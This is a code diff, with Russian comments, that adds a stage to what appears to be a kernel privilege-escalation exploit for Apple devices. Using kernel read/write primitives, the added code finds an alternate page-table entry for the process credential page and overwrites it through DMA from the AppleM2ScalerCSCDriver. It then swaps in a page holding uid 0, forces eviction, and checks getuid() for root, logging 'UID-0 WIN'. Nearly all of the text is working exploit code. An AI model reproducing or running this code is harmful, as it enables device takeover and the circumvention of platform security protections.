@@ -3085,8 +3085,118 @@ static NSString *kpFmtSptmFn(uint64_t raw)
             }
         }
         kpNote(r, [NSString stringWithFormat:@"  [C3] scanned=%u inDART=%u altPTEs=%u", nScanned, nInWindow, nAlt]);
-        if (nAlt == 0)
+        if (nAlt == 0) {
             kpNote(r, @"  [C3] второго маппинга нет — ucred виден только через low-RAM PTE");
+        } else {
+            // ---- 2.0.81: пишем ALT-PTE в DART-окне через DMA ----
+            uint64_t altVA = 0, altPA = 0; uint32_t altOff = 0; uint64_t altVal = 0; int altT = -1;
+            for (uint64_t pa = wB; pa < wB + wS && !altVA; pa += 0x4000) {
+                if (pa < dartLo) continue;
+                int t = kpFrameTypeOf(pa);
+                if (t != 0x0b && t != 0x21) continue;
+                uint64_t al = phystokv(pa);
+                if (!al) continue;
+                for (uint32_t o = 0; o + 8 <= 0x4000; o += 8) {
+                    uint64_t q = early_kread64(al + o);
+                    if ((q & 3) != 3) continue;
+                    if ((q & 0x0000ffffffffc000ULL) == (ucPA & ~0x3fffULL)) {
+                        altVA = al + o; altPA = pa; altOff = o; altVal = q; altT = t;
+                        break;
+                    }
+                }
+            }
+            kpNote(r, [NSString stringWithFormat:@"  [C3] target ALT-PTE va=%#llx pa=%#llx off=%#x t=%d val=%#018llx",
+                      (unsigned long long)altVA, (unsigned long long)altPA, altOff, altT, (unsigned long long)altVal]);
+            if (altVA && altPA >= dartLo) {
+                // sacrificial 0x21-страница с uid=0
+                uint64_t sacPA = 0, sacVA = 0;
+                for (uint64_t pa = wB; pa < wB + wS; pa += 0x4000) {
+                    if (kpFrameTypeOf(pa) != 0x21) continue;
+                    uint64_t al = phystokv(pa);
+                    if (!al || al == ucPage) continue;
+                    int bad = 0;
+                    for (uint32_t o = 0; o < 0x80; o += 8) {
+                        uint64_t q = early_kread64(al + o);
+                        if ((q & 3) == 3 || q == 0x000001f5000001f5ULL) bad = 1;
+                    }
+                    if (!bad) { sacPA = pa; sacVA = al; break; }
+                }
+                uint64_t uoff2 = curUcred & 0x3fff;
+                kpNote(r, [NSString stringWithFormat:@"  [C3] sac=%#llx uoff=%#llx",
+                          (unsigned long long)sacPA, (unsigned long long)uoff2]);
+                if (sacPA && sacVA) {
+                    uint64_t slotVA = sacVA + uoff2;
+                    uint64_t slotSave = early_kread64(slotVA);
+                    early_kwrite64(slotVA, 0);
+                    uint64_t newPte = (altVal & ~0x0000ffffffffc000ULL) | (sacPA & 0x0000ffffffffc000ULL);
+                    // DMA setup
+                    uint64_t ttM2 = 0, isTable2 = 0;
+                    {
+                        uint64_t pr2 = early_kread64(selfProc + koffsetof(proc, proc_ro));
+                        uint64_t tk2 = pr2 ? early_kread64(kp_untag_ptr(pr2) + off_proc_ro_pr_task) : 0;
+                        uint64_t mp2 = tk2 ? early_kread64(kp_untag_ptr(tk2) + off_task_map) : 0;
+                        uint64_t pm2 = mp2 ? early_kread64(kp_untag_ptr(mp2) + koffsetof(vm_map, pmap)) : 0;
+                        ttM2 = pm2 ? kp_untag_ptr(early_kread64(kp_untag_ptr(pm2) + koffsetof(pmap, ttep))) : 0;
+                        uint64_t spc2 = tk2 ? early_kread64(kp_untag_ptr(tk2) + off_task_itk_space) : 0;
+                        uint64_t tb2 = spc2 ? early_kread64(kp_untag_ptr(spc2) + off_ipc_space_is_table) : 0;
+                        if (tb2) isTable2 = (koffsetof(ipc_space, table_uses_smr) && smr_base && t1sz_boot)
+                                          ? kp_untag_ptr(kpSMRDecode(tb2)) : kp_untag_ptr(tb2);
+                    }
+                    BOOL dmaOK = NO;
+                    if (ttM2 && isTable2) {
+                        io_service_t svc2 = IOServiceGetMatchingService(kIOMasterPortDefault,
+                                                                       IOServiceMatching("AppleM2ScalerCSCDriver"));
+                        if (svc2) {
+                            uint8_t tsd2[0x1B0];
+                            memset(tsd2, 0, sizeof(tsd2));
+                            *(uint32_t *)(tsd2 + 0x0C) = 32;
+                            *(uint32_t *)(tsd2 + 0x10) = 32;
+                            dmaOK = kpPhysWrite8v2(svc2, tsd2, ttM2, isTable2, altPA, altOff, newPte, r);
+                            IOObjectRelease(svc2);
+                        }
+                    }
+                    uint64_t rbP = early_kread64(altVA);
+                    kpNote(r, [NSString stringWithFormat:@"  [C3] DMA=%d readback=%#018llx (ждём %#018llx) → %@",
+                              dmaOK, (unsigned long long)rbP, (unsigned long long)newPte,
+                              rbP == newPte ? @"ПРИЛИПЛО ★★" : @"МИМО"]);
+                    if (rbP == newPte) {
+                        atomic_store(&gEvictHit, 0);
+                        pthread_t evT[4];
+                        for (int t = 0; t < 4; t++) pthread_create(&evT[t], NULL, kpEvictWorker, NULL);
+                        for (int ev = 0; ev < 8 && !atomic_load(&gEvictHit); ev++) {
+                            size_t big = 64 * 1024 * 1024;
+                            uint8_t *bigp = mmap(NULL, big, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE, -1, 0);
+                            if (bigp != MAP_FAILED) {
+                                for (uint64_t o = 0; o < big; o += 0x4000) bigp[o] = 1;
+                                munmap(bigp, big);
+                            }
+                            for (int c = 0; c < 100; c++) getpid();
+                            uid_t gu = getuid();
+                            if (gu == 0) atomic_store(&gEvictHit, 1);
+                            kpNote(r, [NSString stringWithFormat:@"  [C3] ev#%d getuid=%u", ev, gu]);
+                        }
+                        for (int t = 0; t < 4; t++) pthread_join(evT[t], NULL);
+                        uid_t u2 = getuid();
+                        if (u2 == 0 || atomic_load(&gEvictHit)) {
+                            kpNote(r, @"=== UID-0 WIN ★★★ (ALT-PTE in DART window) ===");
+                        } else {
+                            io_service_t svc3 = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("AppleM2ScalerCSCDriver"));
+                            if (svc3) {
+                                uint8_t tsd3[0x1B0]; memset(tsd3, 0, sizeof(tsd3));
+                                *(uint32_t *)(tsd3 + 0x0C) = 32; *(uint32_t *)(tsd3 + 0x10) = 32;
+                                kpPhysWrite8v2(svc3, tsd3, ttM2, isTable2, altPA, altOff, altVal, r);
+                                IOObjectRelease(svc3);
+                            }
+                            early_kwrite64(slotVA, slotSave);
+                            kpNote(r, [NSString stringWithFormat:@"  [C3] restored (getuid=%u)", u2]);
+                        }
+                    } else {
+                        early_kwrite64(slotVA, slotSave);
+                        kpNote(r, @"  [C3] DMA не сел");
+                    }
+                }
+            }
+        }
     }
 
     [r appendString:@"[RESULT] АТАКА: завершена — см. строки [ATK]/[RPT]/[W501]/[SPTM]/[C3] выше\n"];
